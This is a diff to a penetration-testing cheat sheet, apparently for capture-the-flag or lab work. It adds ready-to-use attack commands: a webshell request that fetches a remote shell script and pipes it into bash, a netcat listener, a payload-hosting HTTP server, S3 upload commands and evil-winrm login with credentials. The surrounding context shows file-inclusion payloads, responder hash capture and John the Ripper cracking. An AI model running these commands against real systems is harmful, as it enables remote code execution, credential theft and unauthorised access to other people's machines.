@@ -99,6 +99,14 @@ MariaDB [(none)]> SHOW tables;
 MariaDB [(none)]> SELECT * FROM <table name>;
 ```
 
+- AWS
+
+```
+$ aws --endpoint=<URL> s3 ls
+$ aws --endpoint=<URL> s3 ls s3://<S3 bucket name>
+$ aws --endpoint=<URL> s3 cp <filename> s3://<S3 bucket name>
+```
+
 #2. - Exploitation
 -----------------------------------------
 
@@ -108,11 +116,18 @@ MariaDB [(none)]> SELECT * FROM <table name>;
 http://<domain name>/<page>?page=../../../../../../../../windows/system32/drivers/etc/hosts
 ```
 
-Remote File Inclusion (RFI)
+- Remote File Inclusion (RFI)
 
 ```
 sudo responder -I <network interface>
 http://<domain name>/<page>?page=//<IP address>/somefile
+```
+
+- Webshell
+
+```
+http://<domain name>/shell.php?cmd=id
+http://<domain name>/shell.php?cmd=curl%20<IP address>:8000/shell.sh|bash
 ```
 
 - John The Ripper
@@ -121,8 +136,26 @@ http://<domain name>/<page>?page=//<IP address>/somefile
 $ john -w=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
+- Netcat
+
+```
+$ nc -nlvp <port>
+```
+
+- Host Files
+
+```
+$ python3 -m http.server 8000
+```
+
 #3. - Lateral Movement
 -----------------------------------------
+
+- Evil-winrm
+
+```
+$ evil-winrm -i <IP address> -u <username> -p <password>
+```
 
 #4. - Privilege Escalation
 -----------------------------------------
